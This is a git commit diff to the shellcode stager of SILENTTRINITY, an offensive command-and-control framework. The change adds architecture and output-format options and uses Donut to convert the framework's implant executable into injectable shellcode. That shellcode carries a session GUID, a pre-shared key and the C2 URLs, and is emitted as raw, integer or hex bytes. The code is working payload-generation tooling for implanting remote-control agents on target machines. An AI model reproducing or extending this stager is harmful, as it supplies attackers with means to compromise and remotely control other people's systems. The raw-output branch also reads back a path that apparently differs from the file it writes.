bd8254e39fa5d0ccd4aa2ba822189c6ef029b131
root <root@localhost.localdomain>
2019-11-04 15:00:42 +1100

    Fix Shellcode generation stager

--- silenttrinity/core/teamserver/stagers/shellcode.py
+++ silenttrinity/core/teamserver/stagers/shellcode.py
@@ -1,3 +1,4 @@
+import os
 import donut
 import uuid
 from silenttrinity.core.events import Events
@@ -9,11 +10,22 @@ from silenttrinity.core.teamserver.stager import Stager
 class STStager(Stager):
     def __init__(self):
         self.name = 'shellcode'
-        self.description = 'Create SILENTTRINITY Shellcode'
+        self.description = 'Create SILENTTRINITY Shellcode using Donut'
         self.suggestions = ''
         self.extension = 'bin'
         self.author = '@ozzieoffsec, @OOffsec'
-        self.options = {}
+        self.options = {
+            'Architecture' : {
+                'Description'   :   'Architecture of process to inject into (x64, x86, x64+x86). [Warning: getting this wrong will crash things]',
+                'Required'      :   False,
+                'Value'         :   'x64+x86'
+	   },
+            'Format' : {
+		'Description'   :   'Select the output type:  raw, hex, int [All output into a .bin file]',
+		'Required'      :   False,
+                'Value'         :   'raw'
+	   }
+}
 
     def generate(self, listener):
 
@@ -29,19 +41,27 @@ class STStager(Stager):
         arch = 3
 
         #User can specify 64-bit or 32-bit
-        #if self.options['Architecture']['Value'] == 'x64':
-         #   arch = 2
-        #elif self.options['Architecture']['Value'] == 'x86':
-         #   arch = 1
+        if self.options['Architecture']['Value'] == 'x64':
+            arch = 2
+        elif self.options['Architecture']['Value'] == 'x86':
+            arch = 1
 
         donut_shellcode = donut.create(file=get_path_in_package('core/teamserver/data/naga.exe'), params=f"{guid};{psk};{c2_urls}", arch=arch)
 
-        f = open("shellcode.bin", "wb")
-        f.write(donut_shellcode)
-        f.close()
+        if self.options['Format']['Value'] == 'raw':
+                try:
+                    f = open("shellcode.bin", "wb")
+                    f.write(donut_shellcode)
+                    f.close()
+                    with open(get_path_in_package('../shellcode.bin'), 'rb') as bin:
+                         return guid, psk, bin.read().decode('latin-1')
+                finally:
+                     os.remove("shellcode.bin")
 
-        shellcode = shellcode_to_int_byte_array(donut_shellcode)
-        #shellcode = shellcode_to_hex_byte_array(donut_shellcode)
-        #shellcode = donut_shellcode
+        elif self.options['Format']['Value'] == 'int':
+            shellcode = shellcode_to_int_byte_array(donut_shellcode)
+            return guid, psk, shellcode
 
-        return guid, psk, shellcode
+        elif self.options['Format']['Value'] == 'hex':
+            shellcode = shellcode_to_hex_byte_array(donut_shellcode)
+            return guid, psk, shellcode
